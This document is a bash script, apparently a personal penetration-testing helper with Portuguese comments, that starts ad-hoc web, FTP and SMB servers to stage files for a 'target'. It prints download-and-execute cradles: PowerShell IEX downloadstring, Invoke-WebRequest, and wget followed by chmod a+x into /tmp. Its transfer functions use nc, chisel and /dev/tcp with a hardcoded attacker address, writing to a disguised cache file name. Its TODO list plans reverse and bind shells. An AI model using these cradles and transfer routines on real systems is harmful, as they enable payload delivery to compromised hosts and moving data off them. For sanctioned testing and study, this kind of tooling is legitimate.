#!/bin/bash
########## HELP
# Usage
##### HELP
########## TODO
# -b, bind
# -r, reverse
# -s, staged
# -t, tipo, msvenon, bashsocket
##### TODO
########## Import Libs

# bind
# reverse
# stage
# stageless

# escutar porta
# conectar numa porta
# envia bash para outro local
    # socket
    # nc
# shell melhorado
    # pawncat
    # rlwrap
    # python, mostra na tela

########## FUNCTIONS
# Functions
# if not set, ask for it and set it
var_check() {
	local count=1
	for i in "$@"; do
		var_name=$i
		var_value=${!var_name}
		if [ -z "$var_value" ]; then
			read -p "$count. Type the $var_name: " var_value
			eval "$var_name=$var_value"
			((count++))
		fi
	done
}

# select a network interface, return the ip from that interface
select_interface (){
	# Get the list of interfaces without any extraneous characters
	interfaces=( $(ip -c=never -4 -br a | grep "UP\|UNKNOWN" | awk -F' ' '{print $1}') )
	select iface in "${interfaces[@]}"; do
		# Once selected, get the IPv4 address for that interface
		ipv4=$(ip -j -4 -c=never -p addr show "$iface" | grep -oP '"local": "\K[^"]+' | head -n 1)
		
		# Check if an IP was found
		if [ -z "$ipv4" ]; then
			echo "$iface"
			return 1
		else
			echo "$ipv4"
			return 0
		fi
	done
}

set_colors(){
	cred="\e[31m"
	cgreen="\e[32m"
	cyellow="\e[33m"
	cblue="\e[34m"
	cpurp="\e[35m"
	cwhite="\e[36m"
	creset="\e[0m"
}
set_colors

kill_all (){
    sudo kill -9 $(ps aux | grep -Ei "$1" | grep -Ev "grep|$0" | tr -s ' ' | cut -d ' ' -f 2)
}

centerPrint (){
	local color1=${3:-cblue}
	local color2=${4:-cwhite}
	local text=${1:-"STEP"}
	local char=${2:-"."}
	width=$(tput cols)
	width_sides=$(( ( $width - ${#text} )/2 - 1))
	printf -v side "%*s" "$(( $width_sides/${#char} ))" ""; side=${side// /"$char"};
	printf "%b %b %b\n" "${!color1}$side$def" "${!color2}${text}${creset}" "${!color1}$side$creset"
}

print_status(){
	if [ "$1" -eq 0 ]; then
		echo -e "${cgreen}[  OK  ]${creset} $2"
	else
		echo -e "${cred}[ FAIL ]${creset} $2"
	fi
}

print_links(){
	ip=$1
	port=$2
	dir=$3
	centerPrint "DOWNLOAD LINKS"
	echo "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
	OIFS="$IFS"; IFS=$'\n'; for i in $(ls -t "$dir"); do
		centerPrint "$i" " = "
		echo -e "http://$myip:$port/$i"
		echo -e 'IEX(New-Object net.webclient).downloadstring("http://'$ip:$port/$i'")'
		echo -e 'Invoke-WebRequest -Uri "http://'$ip:$port/$i'" -OutFile "C:\Users\Public\'$i'"'
		# echo -e 'certutil.exe -urlcache -split -f "http://'$ip:$port/$i'" "C:\Users\Public\'$i'"'
		# echo -e 'cd /tmp; wget "http://'$ip:$port/$i'" ; chmod a+x "'$i'"'
		echo -e 'cd /tmp && wget "http://'$ip:$port/$i'" && chmod a+x "'$i'"'
	done; IFS="$OIFS"
}

py_webserver () {
	centerPrint "$FUNCNAME" "#"
	# handle_cli_options "$@"
	echo -e "
	1) Veja seu IP 
	2) Na pasta desejada execute esse comando com a porta desejada, 80, 443 somente se for root, mas são mais indicadas 
	3) No alvo abra o endereço visto em 1.
	"
	var_check port
    port=${port:=80}
	echo "Selecione a interface de rede:"
	myip=$(select_interface)
    # var_check port
    cd "$PWD"
    echo "Seu diretório é: $PWD"
	echo "Seu IP é: $myip"
    kill_all http.server
    echo "Outra opção é usar o python2 -m SimpleHTTPServer $port"
    set -x
    sudo python3 -m http.server -d . "$port" &
    set +x
	print_links $myip $port .
    firefox "http://$myip:$port" &
	centerPrint "Pressione OK para fechar na janela q abriu."
    # enquanto não digitar Y, não prossegue
	while [ "$opt" != "Y" ]; do
		read -p "Deseja fechar o servidor? [Y/n] " opt
	done

	
    kill_all http.server
}

py_ftpserver () {
	centerPrint "$FUNCNAME" "#"
	# handle_cli_options "$@"
	echo -e "
	1) Veja seu IP 
	2) Na pasta desejada execute esse comando com a porta desejada, 80, 443 somente se for root, mas são mais indicadas 
	3) No alvo abra o endereço visto em 1.
	"

	var_check port
	echo "Selecione a interface de rede:"
	myip=${target_host:=$(select_interface)}
    port=${port:=21}
    # var_check port
    cd "$PWD"
    echo $PWD
    ip -br a
    kill_all pyftpdlib
    set -x
    sudo python3 -m pyftpdlib -w -p "$port" &
    set +x
    sleep 2
    xdg-open "ftp://$myip:$port" &
     # enquanto não digitar Y, não prossegue
	while [ "$opt" != "Y" ]; do
		read -p "Deseja fechar o servidor? [Y/n] " opt
	done
    kill_all pyftpdlib
}

ruby_webserver () {
	centerPrint "$FUNCNAME" "#"
	# handle_cli_options "$@"
	echo -e "
	1) Veja seu IP 
	2) Na pasta desejada execute esse comando com a porta desejada, 80, 443 somente se for root, mas são mais indicadas 
	3) No alvo abra o endereço visto em 1.
	"

	var_check port
    port=${port:=80}
	echo "Selecione a interface de rede:"
	myip=$(select_interface)
    cd "$PWD"
    echo $PWD
    ip -br a
    kill_all ruby
    set -x
    sudo ruby -run -e httpd . -p $port &
    set +x
    xdg-open "http://$myip:$port" &
     # enquanto não digitar Y, não prossegue
	while [ "$opt" != "Y" ]; do
		read -p "Deseja fechar o servidor? [Y/n] " opt
	done
    kill_all ruby
} 

php_webserver () {
	centerPrint "$FUNCNAME" "#"
	# handle_cli_options "$@"
	echo -e "
	1) Veja seu IP 
	2) Na pasta desejada execute esse comando com a porta desejada, 80, 443 somente se for root, mas são mais indicadas 
	3) No alvo abra o endereço visto em 1.
	"
	var_check port
    port=${port:=80}
	echo "Selecione a interface de rede:"
	myip=$(select_interface)
    cd "$PWD"
    echo $PWD
    ip -br a
    kill_all php
    set -x
    php -S 0.0.0.0:$port &
    set +x
    xdg-open "http://$myip:$port" &
     # enquanto não digitar Y, não prossegue
	while [ "$opt" != "Y" ]; do
		read -p "Deseja fechar o servidor? [Y/n] " opt
	done
    kill_all php
} 

smb_server () {
	centerPrint "$FUNCNAME" "#"
	# handle_cli_options "$@"
	echo -e "
	1) Veja seu IP 
	2) Na pasta desejada execute esse comando com a porta desejada, 80, 443 somente se for root, mas são mais indicadas 
	3) No alvo abra o endereço visto em 1.
	"
	var_check port
    port=${port:=139}
	echo "Selecione a interface de rede:"
	myip=$(select_interface)
    cd "$PWD"
    echo $PWD
    ip -br a
    kill_all impacket
    set -x
	impacket-smbserver sharename . -username  kali -password kali -smb2support
	set +x
    xdg-open "smb://$myip:$port" &
     # enquanto não digitar Y, não prossegue
	while [ "$opt" != "Y" ]; do
		read -p "Deseja fechar o servidor? [Y/n] " opt
	done
    kill_all impacket
} 

send_file(){
	centerPrint "$FUNCNAME" "#"

	var_check target_host target_port

    [ -z "$filename" ] && echo "Selecione o arquivo para enviar:" &&
    select opt in $(ls -t); do  break; done

# var_check application 
	case ${application} in
		scp)
			echo "Rodar isso no atacante"
			var_check pivot_host pivot_port attacker_host attacker_port target_host target_port
			set -x
			chisel chisel client $pivot_host:$pivot_port $attacker_host:$attacker_port:$target_host:$target_port
			set +x
		;;
		nc)
			read -p "Inicie a escuta no servidor com o comando abaixo antes de enviar:
    nc -nvlp $target_port > $filename. ENTER para continuar"
			set -x
			cat "$opt" | nc -nv $target_host $target_port
			set +x
		;;
		*)
			read -p "Inicie a escuta no servidor com o comando abaixo antes de enviar:"
			set -x
			exec 3<>"${targethost}:${target_port:=4444}"
    		cat "$filename" >&3
    		exec 3>&-
			set +x
		;;
	esac
}


receive_file(){
	centerPrint "$FUNCNAME" "#"

	var_check output attacker_host attacker_port
	case ${application:="ssh"} in
		scp)
			echo "Rodar isso no atacante"
			var_check attacker_host attacker_port
			set -x
			scp -P $attacker_port $attacker_host:$output $filename
			set +x
		;;
		nc)
			 echo "Inicie a escuta e depois envie o arquivo pelo outro computador com o comando:
			cat "$opt" | nc -nv $target_host $target_port"
			set -x
			nc -nvlp $attacker_port > $output
			set +x
		;;
		*)
			set -x
			cat < /dev/tcp/${attacker_host:='192.168.93.27'}/${attacker_port:=8888} > ${outfile:='/tmp/xFSMozilla.cache'}
			echo '
			{	while IFS= read -r -d '' -n 1 byte; do
					printf '%s' "$byte" >> "${output:='/tmp/outfile'}"
				done; } < "/dev/tcp/0.0.0.0/${target_port:='4444'}"
			'
			set +x
		;;
	esac
   
}

print_header(){
	help_version="0.2"
	help_dependencies="ssh"
	# colors=( 45 34 94 97 44 ) # azul
	# colors=( 43 31 91 94 42 ) # vermelho
	colors=( 44 32 92 95 43 ) # verde
	# colors=( 45 33 93 96 44 ) # laranja
	# colors=( 46 35 95 98 45 ) # roxo
	# colors=( 48 36 96 99 46 ) # verde oliva
	echo "
	┌─────────────────────┐   [0;${colors[4]}m KK [0;0m[0;${colors[0]}m $(basename $0 .sh | sed "s/^kk//") [0;0m
	│[0;1;${colors[1]};${colors[2]}m╻┏[0m [0;1;${colors[1]};${colors[2]}m╻┏[0m [0;1;${colors[1]};${colors[2]}m╺┳╸┏━┓┏━┓╻[0m  [0;${colors[1]}m┏━┓[0m│   [1;${colors[3]}m Author:  Otávio Augusto[0;0m
	│[0;1;${colors[1]};${colors[2]}m┣┻┓┣┻┓[0m [0;1;${colors[1]};${colors[2]}m┃[0m [0;${colors[1]}m┃[0m [0;${colors[1]}m┃┃[0m [0;${colors[1]}m┃┃[0m  [0;${colors[1]}m┗━┓[0m│   [1;${colors[3]}m Contact: contact@oaugusto.pro[0;0m
	│[0;${colors[1]}m╹[0m [0;${colors[1]}m╹╹[0m [0;${colors[1]}m╹[0m [0;${colors[1]}m╹[0m [0;${colors[1]}m┗━┛┗━┛┗[0;37m━╸┗━┛[0m│   [1;${colors[3]}m Website: http://oaugusto.pro[0;0m
	└─────────────────────┘   [1;${colors[3]}m Social:  @oaugustopro[0;0m

	[0;100m ☕version [0;42m $help_version [0;0m [0;100m ✌license [0;42m MIT [0;0m 
	=================[0;0m [1;${colors[3]}m$(basename $0) execution[0;0m =================[0;0m
	Abre e informa sobre diversos tipos de shell

	Depends on ${help_dependencies}."  | sed -e "s/\t//g"

	echo -e "OPTIONS:" 
	# Show cli options
	cat "$0" | grep -Eo "[A-Za-z]) #.*" | sed "s/\#//g;s/)/,/g;s/^/-/g" | tr '\n' ';'
	echo -e "\nFUNCTIONS:"
	cat "$0" | sed -n '/#STARTOPTIONS1/,/#ENDOPTIONS1/p' | grep -Eo ".*[[:alnum:]]+)$" | tr -d ')\t' | tr -s ' ' | sort -u | cut -d '|' -f 2 | tr '\n' ';'
    echo -e "\n"
}

handle_cli_options (){
	while getopts "u:h:p:H:P::s:t:a:f:F:" option; do
		case $option in
			u) # username of the server
			username="$OPTARG"
			;;
			s) # target port
			sshport="$OPTARG"
			;;
			h) # attacker host
			target_host="$OPTARG"
			;;
			p) # attacker port
			target_port="$OPTARG"
			;;
			H) # pivot host
			pivot_host="$OPTARG"
			;;
			P) # pivot port
			pivot_port="$OPTARG"
			;;
			F) # functions, below
			function="$OPTARG"
			;;
			f) # filename
			filename="$OPTARG"
			;;
			o) # output filename
			output="$OPTARG"
			;;
			a) # application [ssh, nc, pwncat, chiselsrv chiselc, rlwrap, plink]
			application="$OPTARG"
			;;
			*)
				echo "Opção Inválida"
			;;
		esac
	done
}
# Function to handle selection or input
handle_input() {
	#STARTOPTIONS1
    case "$1" in
		*"Python Webserver"|pyhttp)
			py_webserver
		;;
        *"Python FTPServer"|pyftp)
			py_ftpserver
		;;
        *"Ruby Webserver"|rubyhttp)
			ruby_webserver
		;;
        *"PHP Webserver"|phphttp)
			php_webserver
		;;
        *"SMB Server"|smb)
			smb_server
		;;
        *"Send File"|send)
			send_file
		;;
        *"Receive File"|receive)
			receive_file
		;;
		"Sair")
			exit 0
		;;
		*)
			echo "Invalid option $1"
		;;
	esac
	#ENDOPTIONS1
}
##### END FUNCTIONS
########## MAIN
# Main script
print_header
handle_cli_options "$@"
# Check if input is provided
if [ -n "$function" ]; then
    handle_input "$function"
else
    old_IFS=$IFS; IFS=$'\n'; options=( $(cat "$0" | sed -n '/#STARTOPTIONS1/,/#ENDOPTIONS1/p' | grep -Eo ".*[[:alnum:]]+)$" | tr -d '*)\t' | tr -s ' ' | tr -d \" | cut -d '|' -f1) ); IFS=$old_IFS
    echo -e "${cblue} Select an option:$creset"
    select opt in "${options[@]}" "Sair"; do
        handle_input "$opt"
    done
fi
##### END MAIN
trap "kill -- -$$" EXIT